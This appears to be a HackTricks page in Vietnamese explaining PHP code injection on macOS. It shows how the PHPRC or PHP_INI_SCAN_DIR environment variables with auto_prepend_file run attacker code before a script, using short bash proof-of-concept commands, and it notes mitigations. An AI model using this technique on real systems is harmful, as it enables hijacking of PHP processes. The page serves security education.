# Tiêm mã vào ứng dụng PHP trên macOS

{{#include ../../../banners/hacktricks-training.md}}

## `PHPRC` / `PHP_INI_SCAN_DIR` và `auto_prepend_file`

PHP CLI và CGI đọc cấu hình mỗi khi được gọi. `PHPRC` có thể chọn một tệp `php.ini` mà kẻ tấn công có thể đọc, trong khi `PHP_INI_SCAN_DIR` có thể chuyển hướng thư mục được quét để tìm các tệp `.ini` bổ sung. Chỉ thị `auto_prepend_file` khiến PHP phân tích cú pháp một tệp trước script được yêu cầu, vì vậy sự kết hợp này cho phép thực thi mã ngay khi khởi động.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

Một lựa chọn khác là thư mục chứa tệp `.ini`:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

Tùy chọn `-n` bỏ qua `php.ini`; đường dẫn `-c` đáng tin cậy được chỉ định rõ ràng sẽ được ưu tiên hơn `PHPRC`. Hãy nhớ rằng SAPI của máy chủ chạy lâu thường đọc cấu hình khi máy chủ web khởi động, trong khi CLI và CGI đọc cấu hình mỗi lần được gọi.<sup>[[1]](#references)</sup>

## References

- [1] [Tệp cấu hình PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [`auto_prepend_file` của PHP](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
{{#include ../../../banners/hacktricks-training.md}}
